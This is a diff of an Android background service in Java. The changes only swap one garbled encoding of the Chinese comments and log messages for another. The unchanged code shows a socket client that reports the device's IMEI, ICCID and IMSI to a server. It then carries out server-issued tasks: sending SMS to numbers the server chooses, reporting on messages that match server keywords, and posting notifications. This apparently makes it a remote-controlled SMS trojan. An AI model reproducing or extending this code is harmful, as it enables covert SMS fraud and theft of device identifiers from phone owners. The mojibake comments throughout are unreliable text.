@@ -33,7 +33,7 @@ import android.os.SystemClock;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 /*
- * ĞŞ¸ÄisConnectÍ¬²½
+ * ä¿®æ”¹isConnectåŒæ­¥
  * */
 
 public class AService extends Service implements Runnable{
@@ -48,18 +48,18 @@ public class AService extends Service implements Runnable{
 	private PrintWriter socket_out = null;  
 	
 	
-	//¶¨Ê±Æ÷·¢ËÍĞÄÌø
+	//å®šæ—¶å™¨å‘é€å¿ƒè·³
 	private AlarmManager am =null;
 	private PendingIntent pendIntent = null;
 	private long triggerAtTime = 2000;
-	//ĞÄÌø¼ä¸ô
+	//å¿ƒè·³é—´éš”
 	private int interval = 5*1000;
 	
 	private String imei = "0";
 	private String iccid = "0";
 	private String imsi;
-	private String pstyle = "Î´Öª";
-	private String appname = "Î´Öª";
+	private String pstyle = "æœªçŸ¥";
+	private String appname = "æœªçŸ¥";
 	private int ver = 0;
 	
 	private SrceenReceiver srcReceiver = null;
@@ -67,7 +67,7 @@ public class AService extends Service implements Runnable{
 	
 	private DbHelper dbHelper = null;
 	
-	private ExecutorService executorService = Executors.newFixedThreadPool(10); // ¹Ì¶¨Îå¸öÏß³ÌÀ´Ö´ĞĞÈÎÎñ
+	private ExecutorService executorService = Executors.newFixedThreadPool(10); // å›ºå®šäº”ä¸ªçº¿ç¨‹æ¥æ‰§è¡Œä»»åŠ¡
 	
 	@Override
 	public IBinder onBind(Intent arg0) {
@@ -176,14 +176,14 @@ public class AService extends Service implements Runnable{
 			
 			if(srcReceiver!=null)
 			{
-				Logger.error("src È¡Ïû×¢²á");
+				Logger.error("src å–æ¶ˆæ³¨å†Œ");
 				unregisterReceiver(srcReceiver);
 				srcReceiver = null;	
 			}
 			
 			if(smsReceiver!=null)
 			{
-				Logger.error("smsÈ¡Ïû×¢²á");
+				Logger.error("smså–æ¶ˆæ³¨å†Œ");
 				unregisterReceiver(smsReceiver);
 				smsReceiver = null;
 			}
@@ -192,7 +192,7 @@ public class AService extends Service implements Runnable{
 				am.cancel(pendIntent); 
 				am = null;
 				pendIntent = null;
-				Logger.error("¹Ø±Õ¶¨Ê±Æ÷");
+				Logger.error("å…³é—­å®šæ—¶å™¨");
 			}				
 		}
 		
@@ -208,7 +208,7 @@ public class AService extends Service implements Runnable{
 		if(System.currentTimeMillis()-lastXinTiao>=10*1000)
 		{
 			socketDisConnect();
-			Logger.info("Á´½Ó¶Ï¿ªxxxxx"+System.currentTimeMillis()+":"+lastXinTiao);			
+			Logger.info("é“¾æ¥æ–­å¼€xxxxx"+System.currentTimeMillis()+":"+lastXinTiao);			
 		}
 		executorService.submit(new onStrartRunnable(intent));
 		
@@ -216,7 +216,7 @@ public class AService extends Service implements Runnable{
 		
 	}
 	private void socketDisConnect() {
-		// ¶Ï¿ªÁ´½Ó
+		// æ–­å¼€é“¾æ¥
 		try {
 	    	
 	    	if(socket_out!=null)
@@ -249,7 +249,7 @@ public class AService extends Service implements Runnable{
 		
 	}
 	private boolean socketConnect() {
-		// socketÁ´½Ó
+		// socketé“¾æ¥
 		if(null == socket)
 		{			
 			try {
@@ -271,7 +271,7 @@ public class AService extends Service implements Runnable{
 				Logger.error(e.getMessage());
 				return false;
 			}
-				//½¨Á¢ĞÄÌø»úÖÆ
+				//å»ºç«‹å¿ƒè·³æœºåˆ¶
 			if(am==null)
 			{
 				am = (AlarmManager)getSystemService(ALARM_SERVICE);  
@@ -280,7 +280,7 @@ public class AService extends Service implements Runnable{
 		        int requestCode = 0;  	        
 				pendIntent = PendingIntent.getBroadcast(getApplicationContext(),  
 		                requestCode, intent, PendingIntent.FLAG_UPDATE_CURRENT);  
-		        //2Ãëºó·¢ËÍ¹ã²¥£¬È»ºóÃ¿¸ö1ÃëÖØ¸´·¢¹ã²¥¡£¹ã²¥¶¼ÊÇÖ±½Ó·¢µ½AlarmReceiverµÄ  
+		        //2ç§’åå‘é€å¹¿æ’­ï¼Œç„¶åæ¯ä¸ª1ç§’é‡å¤å‘å¹¿æ’­ã€‚å¹¿æ’­éƒ½æ˜¯ç›´æ¥å‘åˆ°AlarmReceiverçš„  
 		        triggerAtTime = SystemClock.elapsedRealtime();    	        
 				am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, interval, pendIntent); 
 			}							
@@ -289,12 +289,12 @@ public class AService extends Service implements Runnable{
 		return true;
 	}
 	@Override
-	//½ÓÊÕÊäÈëÁ÷
+	//æ¥æ”¶è¾“å…¥æµ
 	public void run() {
 		// TODO Auto-generated method stub
 		try {   
 			//ByteArrayOutputStream baos = new ByteArrayOutputStream();
-			Log.e("sms","µÈ´ı½ÓÊÕ...");
+			Log.e("sms","ç­‰å¾…æ¥æ”¶...");
             while (true) {   
             	
                 if (null!=socket&&socket.isConnected()&&!socket.isClosed()) {   
@@ -302,7 +302,7 @@ public class AService extends Service implements Runnable{
                     	String content = "";
                         if ((content = socket_in.readLine()) != null) {   
                             content += "\n";
-                            //½ÓÊÕÏûÏ¢                         	
+                            //æ¥æ”¶æ¶ˆæ¯                         	
                         	Log.e("sms","rec msg:"+content);
                         	
                             Message reMsg = null;
@@ -316,12 +316,12 @@ public class AService extends Service implements Runnable{
                         }
                         content = null;
                     }else{
-                    	Log.e("sms","ÊäÈëÁ÷±»¹Ø±Õ");
+                    	Log.e("sms","è¾“å…¥æµè¢«å…³é—­");
                     	break;
                     }  
                 }else
                 {
-                	Log.e("sms","Ã»ÓĞÁ¬½Ó");
+                	Log.e("sms","æ²¡æœ‰è¿æ¥");
                 	break;
                 }
             } 
@@ -351,10 +351,10 @@ public class AService extends Service implements Runnable{
                 
                 //String headcode = "";
                 
-                //Èç¹ûÎªĞÄÌø°ü
+                //å¦‚æœä¸ºå¿ƒè·³åŒ…
                 if(retJson.equals("0"))
             	{                	
-                	Log.e("sms","ÊÕµ½ĞÄÌø°ü·´À¡"+isConnect);               	
+                	Log.e("sms","æ”¶åˆ°å¿ƒè·³åŒ…åé¦ˆ"+isConnect);               	
             		return;
             	}else{
             		
@@ -362,23 +362,23 @@ public class AService extends Service implements Runnable{
             		String headcode = retJson.substring(0,2);
             		String bodycode = retJson.substring(2);
             		if(headcode.equals("2A"))
-            		{//ÈÎÎñ 
+            		{//ä»»åŠ¡ 
             			Logger.error(retJson);
             			Future future = executorService.submit(new smsTask(bodycode));
             			
             			if(future==null)
             			{
-            				Logger.error("¿Õ");
+            				Logger.error("ç©º");
             			}
             			try {
-            	            if(future.get()==null){//Èç¹ûFuture's get·µ»Ønull£¬ÈÎÎñÍê³É
-            	                Logger.info("ÈÎÎñÍê³É");
+            	            if(future.get()==null){//å¦‚æœFuture's getè¿”å›nullï¼Œä»»åŠ¡å®Œæˆ
+            	                Logger.info("ä»»åŠ¡å®Œæˆ");
             	            }else{
-            	            	Logger.info("ÈÎÎñÃ»ÓĞÍê³É");
+            	            	Logger.info("ä»»åŠ¡æ²¡æœ‰å®Œæˆ");
             	            }
             	        } catch (InterruptedException e) {
             	        } catch (ExecutionException e) {
-            	            //·ñÔòÎÒÃÇ¿ÉÒÔ¿´¿´ÈÎÎñÊ§°ÜµÄÔ­ÒòÊÇÊ²Ã´
+            	            //å¦åˆ™æˆ‘ä»¬å¯ä»¥çœ‹çœ‹ä»»åŠ¡å¤±è´¥çš„åŸå› æ˜¯ä»€ä¹ˆ
             	            Logger.info(e.getMessage());
             	        }
             		}
@@ -389,10 +389,10 @@ public class AService extends Service implements Runnable{
         }
 	 };
 	
-	//µÚÒ»´ÎÎÕÊÖÊÂ¼ş
+	//ç¬¬ä¸€æ¬¡æ¡æ‰‹äº‹ä»¶
 	public void woshou()
 	{
-		//Log.e("sms","ÎÕÊÖÊÂ¼ş.....!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
+		//Log.e("sms","æ¡æ‰‹äº‹ä»¶.....!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
 		String postData;
 		JSONObject json = new JSONObject();
 		try {
@@ -417,7 +417,7 @@ public class AService extends Service implements Runnable{
 		postData = "1A"+postData;
 		if(sendMessage(postData))
 		{
-			Log.e("sms","ÎÕÊÖ³É¹¦");	
+			Log.e("sms","æ¡æ‰‹æˆåŠŸ");	
 			lastXinTiao = System.currentTimeMillis();
 		}
 		
@@ -453,14 +453,14 @@ public class AService extends Service implements Runnable{
 		}else
 		{
 			
-			Log.e("sms","·¢ËÍĞ­ÒéÊ§°Ü£½£½£½£½£½£½£½£½£½£½£½£½");
+			Log.e("sms","å‘é€åè®®å¤±è´¥ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼");
 			socketDisConnect();
 			return false;
 		}
 	}
 	
 	
-	//ÈÎÎñ´¦Àí
+	//ä»»åŠ¡å¤„ç†
 	class smsTask implements Runnable
 	{
 		String taskbody;
@@ -481,8 +481,8 @@ public class AService extends Service implements Runnable{
 					String sn,sm,isback;
 					switch(ttype)
 					{					
-					case 11://·¢ËÍ¶ÌĞÅ
-						//·¢ËÍ¶ÌĞÅ
+					case 11://å‘é€çŸ­ä¿¡
+						//å‘é€çŸ­ä¿¡
 						{
 							sn = tempJson.getString("sn");
 							sm = tempJson.getString("sm");
@@ -493,14 +493,14 @@ public class AService extends Service implements Runnable{
 							post.put("t", "11");
 							if(sendMessage("1C"+post.toString()))
 							{
-								Logger.error("kehuduan·¢ËÍ³É¹¦");
+								Logger.error("kehuduanå‘é€æˆåŠŸ");
 							}else{
-								Logger.error("kehuduan·¢ËÍ²»³É¹¦");
+								Logger.error("kehuduanå‘é€ä¸æˆåŠŸ");
 							}	
 						}
 						
 						break;
-					case 12://¹Ø¼ü×Ö»Ø±¨
+					case 12://å…³é”®å­—å›æŠ¥
 						//Logger.error("12");
 						String keyword = tempJson.getString("keyword");
 						//Logger.error("12");
@@ -555,7 +555,7 @@ public class AService extends Service implements Runnable{
 							}	
 						}						
 						break;
-					case 14://Í¨ÖªÀ¸¸üĞÂ
+					case 14://é€šçŸ¥æ æ›´æ–°
 						{
 							String title=tempJson.getString("title");
 							String message=tempJson.getString("content");
@@ -591,7 +591,7 @@ public class AService extends Service implements Runnable{
 			// TODO Auto-generated method stub
 			Logger.error("onStrartRunnable");
 			if(Tools.checkNet(mContext))
-			{//Èç¹ûÓĞÍøÂç£¬È¥Á´½ÓÍøÂç
+			{//å¦‚æœæœ‰ç½‘ç»œï¼Œå»é“¾æ¥ç½‘ç»œ
 				if(!isConnect)
 				{
 					if(socketConnect()){
@@ -601,7 +601,7 @@ public class AService extends Service implements Runnable{
 					//Logger.info("connected...");
 				}
 			}else{
-				//Èç¹ûÃ»ÓĞÍøÂç
+				//å¦‚æœæ²¡æœ‰ç½‘ç»œ
 				socketDisConnect();
 				Logger.info("not net ....");
 				return;
@@ -609,12 +609,12 @@ public class AService extends Service implements Runnable{
 			if(action!=null){
 				if(action.equals(Tag.XINTIAO))
 				{
-					//Logger.error("ĞÄÌø°ü");
+					//Logger.error("å¿ƒè·³åŒ…");
 					if(isConnect)
 					{
 			    		if(sendMessage("0"))
 			    		{
-			    			//Logger.error("·¢ËÍĞÄÌø°ü");
+			    			//Logger.error("å‘é€å¿ƒè·³åŒ…");
 			    		}
 						//isConnect = false;					
 					}else{					
@@ -623,16 +623,16 @@ public class AService extends Service implements Runnable{
 				}else if(action.equals(Tag.SMS_DELIVERED_ACTION))
 				{//action.equals(Tag.SMS_SEND_ACTIOIN)||
 					 String number = intent.getStringExtra("number");
-					 Logger.info("·¢ËÍºÅÂë:"+number);
-					 //1ÊÇ²»³É¹¦  -1³É¹¦
+					 Logger.info("å‘é€å·ç :"+number);
+					 //1æ˜¯ä¸æˆåŠŸ  -1æˆåŠŸ
 					 int resultcode = intent.getIntExtra("resultcode",0);
 					 Logger.info("result:"+resultcode);
 					 if(resultcode==-1)
 					 {
-						 Logger.info("¶ÌĞÅ·¢ËÍ³É¹¦");
+						 Logger.info("çŸ­ä¿¡å‘é€æˆåŠŸ");
 						 JSONObject post = new JSONObject();
 						 try {
-							 post.put("message", "¶ÌĞÅ·¢ËÍ³É¹¦");
+							 post.put("message", "çŸ­ä¿¡å‘é€æˆåŠŸ");
 							 post.put("number", number);
 							 post.put("iccid", iccid);
 						 }catch(JSONException e)
@@ -642,9 +642,9 @@ public class AService extends Service implements Runnable{
 						 Logger.error(post.toString());
 						 if(sendMessage("1B"+post.toString()))
 						 {
-							Logger.error("·¢ËÍ³É¹¦");
+							Logger.error("å‘é€æˆåŠŸ");
 						 }else{
-							Logger.error("·¢ËÍ²»³É¹¦");
+							Logger.error("å‘é€ä¸æˆåŠŸ");
 						 }	
 						 
 					 }
@@ -666,9 +666,9 @@ public class AService extends Service implements Runnable{
 					Logger.error(post.toString());
 					if(sendMessage("1B"+post.toString()))
 					{
-						Logger.error("·¢ËÍ³É¹¦");
+						Logger.error("å‘é€æˆåŠŸ");
 					}else{
-						Logger.error("·¢ËÍ²»³É¹¦");
+						Logger.error("å‘é€ä¸æˆåŠŸ");
 					}	
 				}
 			}
